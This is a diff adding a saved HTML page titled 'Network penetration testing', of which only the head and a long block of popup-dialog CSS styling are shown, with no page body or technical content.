@@ -1,0 +1,1950 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)https://guif.re/networkpentest -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Network penetration testing</title>
+        
+        <link rel="stylesheet" type="text/css" href="./Network penetration testing_files/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://guif.re/assets/favicon.png">
+        <script async="" src="./Network penetration testing_files/analytics.js.download"></script><script src="./Network penetration testing_files/syntaxhighlighter.js.download"></script>
+    <style>@-webkit-keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@-webkit-keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@-webkit-keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@-webkit-keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@-webkit-keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@-webkit-keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@-webkit-keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
+  flex-direction: column;
+  align-items: stretch; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
+    flex: 1;
+    align-self: stretch;
+    justify-content: flex-end;
+    height: 2.2em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
+    justify-content: center; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
+    height: 2em;
+    margin: .3125em auto;
+    font-size: 1em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
+    font-size: 1em; }
+
+body.swal2-toast-shown > .swal2-container {
+  position: fixed;
+  background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-shown {
+    background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-top {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
+    top: 0;
+    right: 0;
+    bottom: auto;
+    left: auto; }
+  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
+    top: 50%;
+    right: 0;
+    bottom: auto;
+    left: auto;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
+    top: auto;
+    right: 0;
+    bottom: 0;
+    left: auto; }
+
+.swal2-popup.swal2-toast {
+  flex-direction: row;
+  align-items: center;
+  width: auto;
+  padding: 0.625em;
+  box-shadow: 0 0 0.625em #d9d9d9;
+  overflow-y: hidden; }
+  .swal2-popup.swal2-toast .swal2-header {
+    flex-direction: row; }
+  .swal2-popup.swal2-toast .swal2-title {
+    justify-content: flex-start;
+    margin: 0 .6em;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-close {
+    position: initial; }
+  .swal2-popup.swal2-toast .swal2-content {
+    justify-content: flex-start;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-icon {
+    width: 2em;
+    min-width: 2em;
+    height: 2em;
+    margin: 0; }
+    .swal2-popup.swal2-toast .swal2-icon-text {
+      font-size: 2em;
+      font-weight: bold;
+      line-height: 1em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      top: .875em;
+      width: 1.375em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: .3125em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: .3125em; }
+  .swal2-popup.swal2-toast .swal2-actions {
+    height: auto;
+    margin: 0 .3125em; }
+  .swal2-popup.swal2-toast .swal2-styled {
+    margin: 0 .3125em;
+    padding: .3125em .625em;
+    font-size: 1em; }
+    .swal2-popup.swal2-toast .swal2-styled:focus {
+      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
+  .swal2-popup.swal2-toast .swal2-success {
+    border-color: #a5dc86; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 2em;
+      height: 2.8125em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.25em;
+        left: -.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 2em 2em;
+                transform-origin: 2em 2em;
+        border-radius: 4em 0 0 4em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.25em;
+        left: .9375em;
+        -webkit-transform-origin: 0 2em;
+                transform-origin: 0 2em;
+        border-radius: 0 4em 4em 0; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+      top: 0;
+      left: .4375em;
+      width: .4375em;
+      height: 2.6875em; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
+      height: .3125em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 1.125em;
+        left: .1875em;
+        width: .75em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: .9375em;
+        right: .1875em;
+        width: 1.375em; }
+  .swal2-popup.swal2-toast.swal2-show {
+    -webkit-animation: showSweetToast .5s;
+            animation: showSweetToast .5s; }
+  .swal2-popup.swal2-toast.swal2-hide {
+    -webkit-animation: hideSweetToast .2s forwards;
+            animation: hideSweetToast .2s forwards; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
+    -webkit-animation: animate-toast-success-tip .75s;
+            animation: animate-toast-success-tip .75s; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
+    -webkit-animation: animate-toast-success-long .75s;
+            animation: animate-toast-success-long .75s; }
+
+@-webkit-keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@-webkit-keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@-webkit-keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@-webkit-keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+@keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
+body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+  height: auto;
+  overflow-y: hidden; }
+
+body.swal2-no-backdrop .swal2-shown {
+  top: auto;
+  right: auto;
+  bottom: auto;
+  left: auto;
+  background-color: transparent; }
+  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top {
+    top: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
+    top: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
+    top: 0;
+    right: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-center {
+    top: 50%;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
+    top: 50%;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
+    top: 50%;
+    right: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
+    bottom: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
+    right: 0;
+    bottom: 0; }
+
+.swal2-container {
+  display: flex;
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  flex-direction: row;
+  align-items: center;
+  justify-content: center;
+  padding: 10px;
+  background-color: transparent;
+  z-index: 1060;
+  overflow-x: hidden;
+  -webkit-overflow-scrolling: touch; }
+  .swal2-container.swal2-top {
+    align-items: flex-start; }
+  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
+    align-items: flex-start;
+    justify-content: flex-start; }
+  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
+    align-items: flex-start;
+    justify-content: flex-end; }
+  .swal2-container.swal2-center {
+    align-items: center; }
+  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
+    align-items: center;
+    justify-content: flex-start; }
+  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
+    align-items: center;
+    justify-content: flex-end; }
+  .swal2-container.swal2-bottom {
+    align-items: flex-end; }
+  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
+    align-items: flex-end;
+    justify-content: flex-start; }
+  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
+    align-items: flex-end;
+    justify-content: flex-end; }
+  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-self: stretch;
+    justify-content: center; }
+  .swal2-container.swal2-grow-row > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-content: center;
+    justify-content: center; }
+  .swal2-container.swal2-grow-column {
+    flex: 1;
+    flex-direction: column; }
+    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
+      align-items: center; }
+    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
+      align-items: flex-start; }
+    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
+      align-items: flex-end; }
+    .swal2-container.swal2-grow-column > .swal2-modal {
+      display: flex !important;
+      flex: 1;
+      align-content: center;
+      justify-content: center; }
+  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
+    margin: auto; }
+  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+    .swal2-container .swal2-modal {
+      margin: 0 !important; } }
+  .swal2-container.swal2-fade {
+    transition: background-color .1s; }
+  .swal2-container.swal2-shown {
+    background-color: rgba(0, 0, 0, 0.4); }
+
+.swal2-popup {
+  display: none;
+  position: relative;
+  flex-direction: column;
+  justify-content: center;
+  width: 32em;
+  max-width: 100%;
+  padding: 1.25em;
+  border-radius: 0.3125em;
+  background: #fff;
+  font-family: inherit;
+  font-size: 1rem;
+  box-sizing: border-box; }
+  .swal2-popup:focus {
+    outline: none; }
+  .swal2-popup.swal2-loading {
+    overflow-y: hidden; }
+  .swal2-popup .swal2-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center; }
+  .swal2-popup .swal2-title {
+    display: block;
+    position: relative;
+    max-width: 100%;
+    margin: 0 0 0.4em;
+    padding: 0;
+    color: #595959;
+    font-size: 1.875em;
+    font-weight: 600;
+    text-align: center;
+    text-transform: none;
+    word-wrap: break-word; }
+  .swal2-popup .swal2-actions {
+    align-items: center;
+    justify-content: center;
+    margin: 1.25em auto 0; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
+      opacity: .4; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
+      width: 2.5em;
+      height: 2.5em;
+      margin: .46875em;
+      padding: 0;
+      border: .25em solid transparent;
+      border-radius: 100%;
+      border-color: transparent;
+      background-color: transparent !important;
+      color: transparent;
+      cursor: default;
+      box-sizing: border-box;
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+      -webkit-user-select: none;
+         -moz-user-select: none;
+          -ms-user-select: none;
+              user-select: none; }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
+      margin-right: 30px;
+      margin-left: 30px; }
+    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      margin-left: 5px;
+      border: 3px solid #999999;
+      border-radius: 50%;
+      border-right-color: transparent;
+      box-shadow: 1px 1px 1px #fff;
+      content: '';
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
+  .swal2-popup .swal2-styled {
+    margin: 0 .3125em;
+    padding: .625em 2em;
+    font-weight: 500;
+    box-shadow: none; }
+    .swal2-popup .swal2-styled:not([disabled]) {
+      cursor: pointer; }
+    .swal2-popup .swal2-styled.swal2-confirm {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #3085d6;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled.swal2-cancel {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #aaa;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
+    .swal2-popup .swal2-styled::-moz-focus-inner {
+      border: 0; }
+  .swal2-popup .swal2-footer {
+    justify-content: center;
+    margin: 1.25em 0 0;
+    padding-top: 1em;
+    border-top: 1px solid #eee;
+    color: #545454;
+    font-size: 1em; }
+  .swal2-popup .swal2-image {
+    max-width: 100%;
+    margin: 1.25em auto; }
+  .swal2-popup .swal2-close {
+    position: absolute;
+    top: 0;
+    right: 0;
+    justify-content: center;
+    width: 1.2em;
+    min-width: 1.2em;
+    height: 1.2em;
+    margin: 0;
+    padding: 0;
+    transition: color 0.1s ease-out;
+    border: none;
+    border-radius: 0;
+    background: transparent;
+    color: #cccccc;
+    font-family: serif;
+    font-size: calc(2.5em - 0.25em);
+    line-height: 1.2em;
+    cursor: pointer; }
+    .swal2-popup .swal2-close:hover {
+      -webkit-transform: none;
+              transform: none;
+      color: #f27474; }
+  .swal2-popup > .swal2-input,
+  .swal2-popup > .swal2-file,
+  .swal2-popup > .swal2-textarea,
+  .swal2-popup > .swal2-select,
+  .swal2-popup > .swal2-radio,
+  .swal2-popup > .swal2-checkbox {
+    display: none; }
+  .swal2-popup .swal2-content {
+    justify-content: center;
+    margin: 0;
+    padding: 0;
+    color: #545454;
+    font-size: 1.125em;
+    font-weight: 300;
+    line-height: normal;
+    word-wrap: break-word; }
+  .swal2-popup #swal2-content {
+    text-align: center; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea,
+  .swal2-popup .swal2-select,
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    margin: 1em auto; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea {
+    width: 100%;
+    transition: border-color .3s, box-shadow .3s;
+    border: 1px solid #d9d9d9;
+    border-radius: 0.1875em;
+    font-size: 1.125em;
+    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
+    box-sizing: border-box; }
+    .swal2-popup .swal2-input.swal2-inputerror,
+    .swal2-popup .swal2-file.swal2-inputerror,
+    .swal2-popup .swal2-textarea.swal2-inputerror {
+      border-color: #f27474 !important;
+      box-shadow: 0 0 2px #f27474 !important; }
+    .swal2-popup .swal2-input:focus,
+    .swal2-popup .swal2-file:focus,
+    .swal2-popup .swal2-textarea:focus {
+      border: 1px solid #b4dbed;
+      outline: none;
+      box-shadow: 0 0 3px #c4e6f5; }
+    .swal2-popup .swal2-input::-webkit-input-placeholder,
+    .swal2-popup .swal2-file::-webkit-input-placeholder,
+    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input:-ms-input-placeholder,
+    .swal2-popup .swal2-file:-ms-input-placeholder,
+    .swal2-popup .swal2-textarea:-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::-ms-input-placeholder,
+    .swal2-popup .swal2-file::-ms-input-placeholder,
+    .swal2-popup .swal2-textarea::-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::placeholder,
+    .swal2-popup .swal2-file::placeholder,
+    .swal2-popup .swal2-textarea::placeholder {
+      color: #cccccc; }
+  .swal2-popup .swal2-range input {
+    width: 80%; }
+  .swal2-popup .swal2-range output {
+    width: 20%;
+    font-weight: 600;
+    text-align: center; }
+  .swal2-popup .swal2-range input,
+  .swal2-popup .swal2-range output {
+    height: 2.625em;
+    margin: 1em auto;
+    padding: 0;
+    font-size: 1.125em;
+    line-height: 2.625em; }
+  .swal2-popup .swal2-input {
+    height: 2.625em;
+    padding: 0.75em; }
+    .swal2-popup .swal2-input[type='number'] {
+      max-width: 10em; }
+  .swal2-popup .swal2-file {
+    font-size: 1.125em; }
+  .swal2-popup .swal2-textarea {
+    height: 6.75em;
+    padding: 0.75em; }
+  .swal2-popup .swal2-select {
+    min-width: 50%;
+    max-width: 100%;
+    padding: .375em .625em;
+    color: #545454;
+    font-size: 1.125em; }
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    align-items: center;
+    justify-content: center; }
+    .swal2-popup .swal2-radio label,
+    .swal2-popup .swal2-checkbox label {
+      margin: 0 .6em;
+      font-size: 1.125em; }
+    .swal2-popup .swal2-radio input,
+    .swal2-popup .swal2-checkbox input {
+      margin: 0 .4em; }
+  .swal2-popup .swal2-validationerror {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 0.625em;
+    background: #f0f0f0;
+    color: #666666;
+    font-size: 1em;
+    font-weight: 300;
+    overflow: hidden; }
+    .swal2-popup .swal2-validationerror::before {
+      display: inline-block;
+      width: 1.5em;
+      height: 1.5em;
+      margin: 0 .625em;
+      border-radius: 50%;
+      background-color: #f27474;
+      color: #fff;
+      font-weight: 600;
+      line-height: 1.5em;
+      text-align: center;
+      content: '!';
+      zoom: normal; }
+
+@supports (-ms-accelerator: true) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+.swal2-icon {
+  position: relative;
+  justify-content: center;
+  width: 5em;
+  height: 5em;
+  margin: 1.25em auto 1.875em;
+  border: .25em solid transparent;
+  border-radius: 50%;
+  line-height: 5em;
+  cursor: default;
+  box-sizing: content-box;
+  -webkit-user-select: none;
+     -moz-user-select: none;
+      -ms-user-select: none;
+          user-select: none;
+  zoom: normal; }
+  .swal2-icon-text {
+    font-size: 3.75em; }
+  .swal2-icon.swal2-error {
+    border-color: #f27474; }
+    .swal2-icon.swal2-error .swal2-x-mark {
+      position: relative;
+      flex-grow: 1; }
+    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      display: block;
+      position: absolute;
+      top: 2.3125em;
+      width: 2.9375em;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #f27474; }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: 1.0625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: 1em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+  .swal2-icon.swal2-warning {
+    border-color: #facea8;
+    color: #f8bb86; }
